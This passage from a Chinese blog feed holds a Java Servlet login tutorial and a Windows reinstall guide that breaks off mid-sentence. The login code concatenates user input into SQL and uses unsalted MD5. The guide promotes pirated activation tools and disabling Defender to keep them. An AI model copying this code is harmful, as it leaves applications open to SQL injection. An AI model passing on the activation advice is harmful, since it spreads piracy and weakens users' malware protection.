class="string">&quot;button&quot;</span> class=<span class="string">&quot;weui-btn weui-btn_primary&quot;</span> wah-hotarea=<span class="string">&quot;click&quot;</span> type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;确定&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li>修改Web.xml文件，添加servlet标签</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>login<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ruanko.newspublish.action.login.login<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>login<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>login.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>创建处理登入的DAO层代码</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ruanko.newspublish.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ruanko.newspublish.entity.Article;</span><br><span class="line"><span class="keyword">import</span> ruanko.newspublish.entity.Users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UsersDao</span> <span class="keyword">extends</span> <span class="title class_">BaseDao</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(Users users)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;INSERT INTO users(username, password) VALUES(&#x27;&quot;</span>+</span><br><span class="line">                users.getUsername() +</span><br><span class="line">                <span class="string">&quot;&#x27;,&#x27;&quot;</span>+</span><br><span class="line">                users.getPassword() +</span><br><span class="line">                <span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;SQL =&#123;&quot;</span>+sql+<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        executeUpdate(sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Users <span class="title function_">login</span><span class="params">(String username)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username= &#x27;&quot;</span> + username+<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;SQL = &#123;&quot;</span>+sql+<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> getConnection();</span><br><span class="line">        Statement statement;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            statement = connection.createStatement();</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line">            <span class="keyword">if</span> (resultSet.next()) &#123;</span><br><span class="line">                <span class="type">Users</span> <span class="variable">users1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Users</span>();</span><br><span class="line">                users1.setUid(resultSet.getInt(<span class="string">&quot;uid&quot;</span>));</span><br><span class="line">                users1.setUsername(resultSet.getString(<span class="string">&quot;username&quot;</span>));</span><br><span class="line">                users1.setPassword(resultSet.getString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">                closeAll(connection, statement, resultSet);</span><br><span class="line">                <span class="keyword">return</span> users1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            System.out.println(<span class="string">&quot;[mysql]查询用户名或密码错误&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updatePassword</span><span class="params">(Users users)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;UPDATE users SET password = &#x27;&quot;</span>+ users.getPassword()+<span class="string">&quot;&#x27; WHERE username = &#x27;&quot;</span> +</span><br><span class="line">                users.getUsername() + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;SQL =&#123;&quot;</span>+sql+<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        executeUpdate(sql);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="6"><li>创建处理登入的Servive层代码</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ruanko.newspublish.biz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ruanko.newspublish.dao.UsersDao;</span><br><span class="line"><span class="keyword">import</span> ruanko.newspublish.entity.Users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UsersBiz</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UsersDao usersDao;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UsersBiz</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.usersDao = <span class="keyword">new</span> <span class="title class_">UsersDao</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(Users users)</span>&#123;</span><br><span class="line">        usersDao.register(users);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Users <span class="title function_">login</span><span class="params">(String username)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> usersDao.login(username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updatePassword</span><span class="params">(Users users)</span>&#123;</span><br><span class="line">        usersDao.updatePassword(users);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>创建处理登入操作的Servlet代码</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ruanko.newspublish.action.login;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ruanko.newspublish.biz.UsersBiz;</span><br><span class="line"><span class="keyword">import</span> ruanko.newspublish.entity.Users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">login</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        request.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="type">Users</span> <span class="variable">users</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Users</span>();</span><br><span class="line">        users.setUsername(request.getParameter(<span class="string">&quot;username&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(password);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">hashPassword</span> <span class="operator">=</span> md5(password);</span><br><span class="line"><span class="comment">//        System.out.println(&quot;MD5 = &quot;+hashPassword);</span></span><br><span class="line">        users.setPassword(hashPassword);</span><br><span class="line"></span><br><span class="line">        <span class="type">UsersBiz</span> <span class="variable">usersBiz</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsersBiz</span>();</span><br><span class="line">        <span class="keyword">if</span> (usersBiz.login(users.getUsername())!=<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;MysqlPasswordMd5 = &quot;</span>+usersBiz.login(users.getUsername()).getPassword());</span><br><span class="line">            <span class="keyword">if</span> (Objects.equals(usersBiz.login(users.getUsername()).getPassword(), hashPassword))&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;登入成功,跳转页面至 index.jsp&quot;</span>);</span><br><span class="line">                request.getRequestDispatcher(<span class="string">&quot;index.jsp&quot;</span>).forward(request,response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;登入失败，返回login.jsp&quot;</span>);</span><br><span class="line">            request.setAttribute(<span class="string">&quot;message&quot;</span>,<span class="string">&quot;登入失败，请检查用户名和密码是否正确!&quot;</span>);</span><br><span class="line">            request.getRequestDispatcher(<span class="string">&quot;login.jsp&quot;</span>).forward(request,response);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String str)</span>&#123;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">messageDigest</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            messageDigest = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>); <span class="comment">//生成md5计算摘要</span></span><br><span class="line">            messageDigest.update(str.getBytes()); <span class="comment">//计算md5</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="number">1</span>,messageDigest.digest()).toString(<span class="number">16</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x02-登入模块操作截图"><a href="#0x02-登入模块操作截图" class="headerlink" title="0x02 登入模块操作截图"></a>0x02 登入模块操作截图</h3><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220512163230794.png" alt="image-20220512163230794"></p><blockquote><p>登入成功，跳转到<code>index.jsp</code>主界面</p></blockquote><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220512163310688.png" alt="image-20220512163310688"></p><blockquote><p>登入失败，提示错误信息</p></blockquote><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220512163408848.png" alt="image-20220512163408848"></p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Servlet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统重装保姆级教程</title>
      <link href="/2022/04/18/5ede1c3809e8-q1jun/"/>
      <url>/2022/04/18/5ede1c3809e8-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="系统重装保姆级教程"><a href="#系统重装保姆级教程" class="headerlink" title="系统重装保姆级教程"></a>系统重装保姆级教程</h1><blockquote><p>写给还不会装机的人： 对于没有接触过系统重装的人来说，装系统是一个很高端很难的事情。事实上，装机真的简单到不得了，我们只是把前人的劳动成果照搬而已，<strong>所有装机用到的东西，都不是我们自己创作的，我们只是学会如何用而已</strong>。</p><p>因为硬盘分区表格式的不同，以及其他各种原因，<strong>如果不去设置，Win7只能重装Win7，Win10只能重装Win10</strong>。鉴于这是一篇傻瓜式教程，怎么修改BIOS以及硬盘分区表格式等等这次暂时不教，先学会重装。<strong>如果你真的很需要，百度有全面的教程，照做一般没啥问题</strong>。</p><p>如果你只是想重置系统，请继续往下翻。</p><p>如果你想保留个人数据而不是重装一个系统，或者电脑出了问题以下方法不适用，请往下翻参照：<strong>【教程五】Win10万能恢复</strong> 基本上可以解决操作系统系统带来的各种问题以及绝大部分__蓝屏__。</p></blockquote><h2 id="【教程一】Windows系统重装"><a href="#【教程一】Windows系统重装" class="headerlink" title="【教程一】Windows系统重装"></a>【教程一】Windows系统重装</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="一般来说，有3种装机方式"><a href="#一般来说，有3种装机方式" class="headerlink" title="一般来说，有3种装机方式"></a>一般来说，有3种装机方式</h4><ol><li><p>使用PE盘安装，用制作工具将U盘里装入一个PE系统（精简版Windows），然后重启电脑进入U盘，用PE系统里自带的工具，来完成重装。</p><ul><li><p>相比起其他方式，PE U盘装机的好处是可以随时随地给任何电脑装机，可以通过PE系统里的工具进行分区、引导修复、密码清除等等，同时因为可以访问硬盘，在你系统崩溃的时候，抢救出原系统里的文件。</p></li><li><p>常用的PE制作工具有：</p><ul><li>无广告无捆绑的：微PE，优启通；</li><li>有广告有捆绑但可以关闭的：电脑店；</li><li>有广告有捆绑的：大白菜老毛桃等等</li></ul></li><li><p>PE盘的制作过程中会格式化U盘，所以建议选一个空白U盘，或者先将U盘文件拷出，制作完成之后再拷入。<strong>制作完成的PE盘完全可以当普通U盘来使用。</strong></p></li><li><p><strong>推荐直接使用微PE，公认的最好用的PE系统</strong></p></li></ul></li><li><p>用UltraISO等工具，将Windows镜像文件(ISO格式)刻录到U盘；或者使用微软官网提供的工具刻录U盘。之后依然是重启电脑进入U盘，这种方法原汁原味，安装过程和买到的正版Windows光盘的安装方法完全一样，缺点是没有各种PE工具，也<strong>不能拯救电脑里的文件</strong>。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331170928.png"></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331170934.png"></p></li><li><p>通过硬盘安装，即通过“小白一键重装系统”等类似工具，只需要电脑能开机就可以安装系统。最不推荐的方式，因为<strong>一旦出现问题，电脑开不了机，你就只能去网吧或者找别的电脑，制作U盘来拯救。</strong></p></li></ol><h4 id="重装完的系统还是正版吗？-x2F-我安装的系统是正版吗？"><a href="#重装完的系统还是正版吗？-x2F-我安装的系统是正版吗？" class="headerlink" title="重装完的系统还是正版吗？&#x2F;我安装的系统是正版吗？"></a>重装完的系统还是正版吗？&#x2F;我安装的系统是正版吗？</h4><ol><li><p>首先要明确什么是正版：让开发者获得他认同的、合法的收益，你获得的软件服务才是正版。</p></li><li><p>明确了什么是正版，那就清楚了：除了自己和公司购买的系统，或者买回的电脑自带的系统是正版，其他的都是盗版系统，包括某宝某多多买的，也是盗版系统。</p></li><li><p>常见的激活方法</p><ul><li>如果你的电脑自带<strong>家庭版</strong>Win10，那么你重装了<strong>家庭版</strong>之后只要联网，就可以自动激活，<strong>专业版和其他版本同理，只要安装同一版本就能自动激活</strong>；</li><li>通过<strong>Win10数字权利激活工具</strong>激活的系统，可以获得和正版一模一样的服务，比如重装之后联网自动激活、更新系统等等，不适用于Win7；</li><li>通过<strong>KMS激活工具</strong>激活的系统，不可以重装激活，且激活时间一般为180天，大部分工具会在180后续激活，如果你的电脑在180天以内没有联网，KMS无法续激活成功，那么你的系统就崩了。Win7只能用KMS激活；</li><li>通过某宝&#x2F;某多多购买的密钥激活的系统，便宜的不可以重装，贵一些的可以重装，一定要问清楚卖家。（友情提示：翻看宝贝的评论区，查看评论区的图片，大概率可以白嫖到激活密钥）</li></ul><p><strong>谨一推荐的即为数字权利激活方式，虽然是盗版，但是和正版完全一样，大家可以放心使用。</strong></p></li></ol><hr><h3 id="一、下载装机所需文件"><a href="#一、下载装机所需文件" class="headerlink" title="一、下载装机所需文件"></a>一、下载装机所需文件</h3><h4 id="1-Windows系统"><a href="#1-Windows系统" class="headerlink" title="1. Windows系统"></a>1. Windows系统</h4><p>地址：<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">msdn.itellyou.cn</a><br>进去之后从左边的列表里选择**”操作系统”**，然后找到最新版下载即可<br>比如我现在Win10的选择：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331170940.jpg"></p><ul><li><p>consumer editions为消费者版镜像，包含家庭版和专业版等多个版本；business editions为商业版镜像，不包含家庭版，包含企业版和专业版等多个版本；这两个版本其实都可以，一般大家会下载消费者版。</p></li><li><p>镜像文件名里的（x64）表示适用于64位电脑，建议4G内存以上，配置较好的电脑使用，（x84）适用于32位电脑，4G内存以下，配置较差、老电脑。</p></li><li><p>ed2k:&#x2F;&#x2F;开头的即为电驴下载链接，可以使用迅雷下载，也可以使用百度网盘离线下载功能离线到网盘里，再用网盘下载</p></li></ul><p>  Win7的选择：一般大家使用的Win7都是带SP1补丁的旗舰版，如图中所示：<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331170946.jpg"></p><p>   Xp的选择：因为原版Xp装机过于繁琐，一般都使用Ghost系统，驱动和激活都能很好的解决。使用深度技术、番茄花园、雨林木风等等的<strong>纯净版</strong>Ghost Xp均可。</p><blockquote><p>注意：<br>MSDN2020年可能会启用新站**<a target="_blank" rel="noopener" href="https://next.itellyou.cn/">next.itellyou.cn</a>**，新站的界面更好看，但使用方法应该是类似的，大家灵活运用即可</p><p><strong>非常不推荐大家使用Ghost系统</strong>，即网上随处可见的纯净版、装机版、快速安装版等等，至于为什么大家可以自行百度“Ghost系统的坏处”，<strong>记住一点：用原版系统就是最安全的，最好用的！</strong></p></blockquote><h4 id="2-下载微PE刻录工具"><a href="#2-下载微PE刻录工具" class="headerlink" title="2. 下载微PE刻录工具"></a>2. 下载微PE刻录工具</h4><p>微PE：<a target="_blank" rel="noopener" href="http://www.wepe.com.cn/download.html">www.wepe.com.cn</a></p><p>在2017年的2.0版本之后，微PE终于有了2.1版本更新，所有老旧的工具都有了最新的版本，很多之前没有的功能也得到了补充，再次坐回了PE系统的头把交椅，最后一个不用微PE的理由也没了。</p><p>需要注意的是现在微PE的官网需要打赏才能显示地址，价格两元起，<strong>不过作者提供了“已捐赠，查看下载地址”的按钮，所以大家懂得。</strong>不过维护一个免费，无广告的工具还是挺耗心思的，大家有条件的就可以随便打赏一下，饿死开发者最终吃亏的还是我们用户。<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200812204134.png"></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200812204128.png"></p><h4 id="3-下载显卡驱动"><a href="#3-下载显卡驱动" class="headerlink" title="3. 下载显卡驱动"></a>3. 下载显卡驱动</h4><p><strong>非常不推荐高性能独显使用Win10自动安装的驱动，版本低，还会有各种奇怪的问题，除显卡外其他驱动可以不用在意</strong></p><p><strong>Nvdia英伟达显卡</strong>：<a target="_blank" rel="noopener" href="https://www.nvidia.cn/Download/Find.aspx?lang=cn">www.nvidia.cn/Download/Find.aspx?lang=cn</a></p><ul><li><p><strong>目前Nvdia官网和Win10提供的驱动都是DCH驱动</strong>，即不带Nvdia控制面板，需要自行到Win10应用商店下载，<strong>不去下载安装就会一直弹窗</strong>，同时也意味着Win7不能安装该驱动。目测这么干是为了劝退Win7用户，增加Win10应用商店活跃度。<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171302.png"></p></li><li><p>标准版驱动（带Nvdia控制面板）的下载入口目前只有这个，请大家收藏上面的网址：<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331170957.jpg"></p></li></ul><p> <strong>AMD显卡</strong>：<a target="_blank" rel="noopener" href="https://www.amd.com/zh-hans/support">www.amd.com/zh-hans/support</a></p><h4 id="4-下载驱动工具"><a href="#4-下载驱动工具" class="headerlink" title="4. 下载驱动工具"></a>4. 下载驱动工具</h4><p>360驱动大师：<a target="_blank" rel="noopener" href="http://weishi.360.cn/qudongdashi/">weishi.360.cn&#x2F;qudongdashi</a><br>比起驱动精灵驱动人生等等，这个至少没广告和捆绑软件，算是可以用一用，<strong>但在用之前请你看完</strong>：</p><ul><li>如果你是品牌笔记本，一般都有对应的驱动工具或者驱动下载地址，比如联想电脑都可以用联想驱动管理软件，戴尔电脑可以去戴尔官网按机型查询驱动。<strong>我们推荐你使用品牌方提供的驱动，因为这和你的电脑最为契合</strong></li><li>如果是重装Win10，Win10会自动在联网时自动帮你补齐驱动，只要等待一会就可以。</li><li>如果是重装Win7，Win7是无法自动补齐驱动的，所以一定要<strong>提前下载网卡版驱动大师</strong>。<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171002.png"></li></ul><hr><h3 id="二、制作PE盘"><a href="#二、制作PE盘" class="headerlink" title="二、制作PE盘"></a>二、制作PE盘</h3><ol><li><p>到<a target="_blank" rel="noopener" href="http://www.wepe.com.cn/download.html">微PE官网</a>下载好微PE之后插入U盘，运行微PE，点击右下角的安装到U盘<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171102.png"></p></li><li><p>之后的设置直接默认即可，全能三分区方式基本可以支持所有的电脑，<strong>制作过程中会格式化U盘</strong>，所以建议选一个空白U盘，或者先将U盘文件拷出，制作完成之后再拷入。<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171106.png"></p></li><li><p>如果你只是为一台电脑重装系统，系统镜像文件不用放入U盘，放到非C盘即可，如果你想为其他电脑重装，在制作完成后把镜像文件放入U盘，就可以很方便的为他人重装系统，<strong>前提是U盘空间够大</strong>。</p></li><li><p>如果你不需要微PE U盘了，因为有三个分区，直接格式化可能会有问题，一个比较好的方法是<strong>先用微PE里的单分区方式再制作一次，然后再格式化</strong>，就可以完美还原。</p></li></ol><hr><h3 id="三、进入U盘-PE系统"><a href="#三、进入U盘-PE系统" class="headerlink" title="三、进入U盘 PE系统"></a>三、进入U盘 PE系统</h3><p>开机之后，在看到电脑品牌LOGO是立即连续不断的敲击F12，进入F12 快速选择界面（各型号电脑进入方式不同，请自行百度<strong>“电脑型号&#x2F;主板型号+设置U盘第一启动）</strong>，选择自己的U盘，一般有<strong>“USB”字样或者是U盘品牌</strong>：</p><p>比如我这里选的是我的金士顿Kingston U盘：<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171111.jpg"></p><hr><h3 id="四、开始重装系统"><a href="#四、开始重装系统" class="headerlink" title="四、开始重装系统"></a>四、开始重装系统</h3><ol><li>在PE系统里点击<strong>“CGI备份还原”</strong>，然后在第二项里选择自己要装系统的盘，请根据大小来判断哪个是你的C盘，不要根据盘符来判断：</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171118.jpg"></p><ol start="2"><li>在CGI备份还原的第三项里选择自己下载的系统镜像文件，然后会弹出系统版本选择界面，Home即为家庭版，一般选择Pro专业版，大家按需选择：</li></ol><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171122.jpg"></p><ol start="3"><li><p>然后就可以点击执行，在进度条结束之后，拔掉U盘，重启电脑，就可以进入新系统，重装完成。<br><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/20200331171126.jpg"></p></li><li><p>如果你调整或删除了系统盘的隐藏分区，比如很多人为了干净，会选择删除所有分区，或者使用了新的没有安装过系统的硬盘，可能会遇到重启之后无法进去系统的情况，请往下翻参照：<strong>【教程四】无法引导系统解决办法</strong></p></li><li><p>Xp系统因为推荐使用纯净版Ghost系统，在安装系统时请选择<strong>“Ghost备份还原”</strong>，其余操作与上面的步骤是类似的。</p></li></ol><hr><h3 id="五、系统激活"><a href="#五、系统激活" class="headerlink" title="五、系统激活"></a>五、系统激活</h3><ol><li><p>开头的前言里我们讲明白了正版盗版的问题，和各种激活方式的不同，<strong>没仔细看的同学请到前言里仔细看。如果你是自带的Win10家庭版且重装的也是家庭版，联网等一会就可以自动激活。</strong></p></li><li><p>Win10数字权利激活工具和KMS工具（支持Win7）我已经上传到了网盘里，大家自己下载使用即可。<strong>但是在使用前请先看【教程二】第一步“暂时关闭Defender”，否则你的工具会在解压后消失不见，只留下一个空文件夹</strong></p><p>度盘：<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1QmPmeEJeyW--bvGJngA3pQ">pan.baidu.com&#x2F;s&#x2F;1QmPmeEJeyW–bvGJngA3pQ</a><br>密码: f898</p><p>蓝奏云：<br>链接: <a target="_blank" rel="noopener" href="https://www.lanzoux.com/b034r543c">www.lanzoux.com/b034r543c</a><br>密码: 